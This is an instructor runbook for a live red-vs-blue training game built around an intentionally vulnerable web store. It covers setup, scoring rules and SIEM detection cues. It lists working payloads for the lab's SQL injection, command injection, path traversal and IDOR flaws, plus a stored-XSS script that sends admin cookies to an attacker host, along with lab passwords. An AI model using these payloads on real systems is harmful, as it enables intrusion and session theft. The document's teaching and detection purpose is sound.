# Instructor Runbook — Live Red vs Blue

> **Do not hand this to students.** It contains the flags, the exploits, and the
> hidden grading rules.

## What the game is

Red attacks the store for flags. Blue watches the live SIEM and calls out the
IPs doing hostile things; a confirmed call takes that attacker off the board —
**you** verify the student powers their machine down. Blue's tension is that the
SIEM is full of innocents (a shopper bot browsing from many IPs, plus the admin
bot), and a call without real evidence is friendly fire: it costs the analyst
points, an ammo charge, and their shift.

The verdict that decides a call is **hidden** from blue. They must recognise the
attack from raw telemetry — a web server spawning `sh`, a `UNION SELECT` in a
query string, an order read by the wrong user. That recognition *is* the lesson.

## Before class

```bash
./deploy.sh user@majalstore          # or: docker compose up -d --build on the VM
```

First build pulls the Playwright image (~2 GB) for the admin bot — do it ahead of
time, not in front of the room. Then open the four screens:

- Projector: **`http://<vm>:8000/board`**
- Your laptop: **`http://<vm>:8000/instructor?token=<INSTRUCTOR_TOKEN>`**
  (default token `majal-instructor`; set `INSTRUCTOR_TOKEN` to change it)
- Confirm the store shows real client IPs: `docker compose logs store | tail`

Set the token before deploying if you want a private one:
```bash
INSTRUCTOR_TOKEN=<secret> docker compose up -d
```

## Run of show

1. **Split the room** into red and blue. Each red player works from their own
   machine (its own IP — that's what gets called). Blue can pair up.
2. **Brief each side** on their one URL (see the table in `README.md`). Reds pick
   a handle at `/red`; blues sign in on the console.
3. On the instructor panel set the phase to **Live**. (Lobby/Ended block calls.)
4. Play. Watch the kill queue fill.
5. **The kill workflow** — when a confirmed call appears in your queue:
   - It shows the **IP → red handle**, who called it, and the evidence event.
   - Find that student, confirm they really are the attacker, tell them to
     **shut their machine down**, then click **Confirm eliminated**. That blocks
     their flag submissions and marks them out on the board.
   - *Dismiss* if you decide not to action it; *Undo* to reopen.
6. **Reset between rounds:** `./reset.sh` — new flags, clean scoreboard. Announce
   that everything captured before now is void.
7. At the end, set phase to **Ended** and hit **Reveal verdicts** — every screen
   now shows the ground-truth label on each event, for the debrief.

## Tuning the economy

| Env | Default | Effect |
|-----|---------|--------|
| `FRIENDLY_FIRE` | `eliminate` | wrong call ends the analyst's shift. Set `penalty` to only dock points/ammo/cooldown so the room can't empty out early. |
| `AMMO_START` | `5` | wrong calls an analyst can afford (only bites in `penalty` mode; in `eliminate` mode one wrong call ends the shift regardless). |
| `COOLDOWN_SEC` | `60` | lockout after a wrong call. |
| `SHOPPERS` | `12` | more shoppers = more innocents = more danger in calling on volume. |

If early rounds are brutal (good analysts knocked out on one slip), switch to
`FRIENDLY_FIRE=penalty` and raise `AMMO_START`.

## The flags (this changes every boot — read the live values)

The current round's values are in the `flags` volume:
```bash
docker compose exec siem cat /shared/flags.json
```

| Vuln | Where | Exploit |
|------|-------|---------|
| **SQLi** | `secrets` table | Search: `?q=' UNION SELECT 1,value,'x',0,0,'y' FROM secrets WHERE name='flag'-- -` → flag renders as a product. (Login `admin'--` is the auth-bypass path.) |
| **CmdI** | `/srv/flags/cmdi.flag`, `$FLAG_CMDI` | Reach admin (via SQLi login bypass), Network Tools → host `8.8.8.8; cat /srv/flags/cmdi.flag` or `8.8.8.8; env`. |
| **Traversal** | `/srv/majal/vault/traversal.flag` | Log in, `receipt?file=../../../../../srv/majal/vault/traversal.flag`. |
| **IDOR** | Maha Al-Faisal's order (#1 after seed) | Log in as any student, visit `/order/1` — order notes hold the flag. |
| **Stored XSS** | admin-only `/admin/flag` | Post a review with `<script>` that fetches `/admin/flag` and beacons it out. The admin bot renders it every ~20 s in an authenticated session. A cookie-beacon (`new Image().src=…`) avoids CORS; a `fetch()` works too. Example: `<script>new Image().src='http://<red-ip>:PORT/x?f='+encodeURIComponent(document.cookie)</script>` then browse `/admin/flag` with the stolen cookie — or fetch `/admin/flag` directly inside the payload and beacon the body. |

Accounts: `admin` / `M@jal-Adm1n-2026`; `student01…50` / `majal01…50`;
`m.alfaisal` / `Sunset!992`.

## How blue is *meant* to catch each attack (the teaching)

| Attack | The tell in the SIEM |
|--------|----------------------|
| CmdI | a `procstart` where **gunicorn spawned `sh`/`curl`/`nc`** — the payload is in the cmdline. Plus the `POST /admin` from the same IP. |
| C2 / reverse shell | a `netconn` **outbound** from a web-spawned process to an odd host. |
| SQLi | `UNION SELECT` / `--` / `' OR` sitting in a query string or login field. |
| Traversal | `receipt?file=` with `../` climbing out of the receipts folder. |
| IDOR | `GET /order/<id>` returning 200 for a student who doesn't own it. |
| Stored XSS | a review **POST whose body contains `<script>`/`onerror`** — that POST's IP is the attacker. (The admin's own `/admin/flag` read is the *victim*, not the attacker — calling the admin is friendly fire.) |

## Troubleshooting

- **Every attacker shows the same IP** → the store isn't seeing real client IPs.
  Check `docker compose logs store`. LAN/Tailscale clients on the published port
  are preserved; if you fronted it with a proxy, make the proxy set
  `X-Forwarded-For` and add the proxy's address to `TRUST_PROXY_CIDR`.
- **Red submits a valid flag but it's rejected** → they're eliminated, or the
  round was reset (flags re-minted). Check the board and `/shared/flags.json`.
- **Admin bot isn't triggering XSS** → `docker compose logs admin`; confirm it
  logged in and is sweeping products. The payload must be a `<script>`/handler
  the browser will actually execute.
- **Blue console empty** → `docker compose logs siem`; confirm the store's
  `SIEM_URL` reaches it and events are ingesting.
- **Someone fork-bombs the store** → guard rails (`pids_limit`, cpu/mem) kill the
  container, not the VM; `docker compose restart store` (or `./reset.sh`).
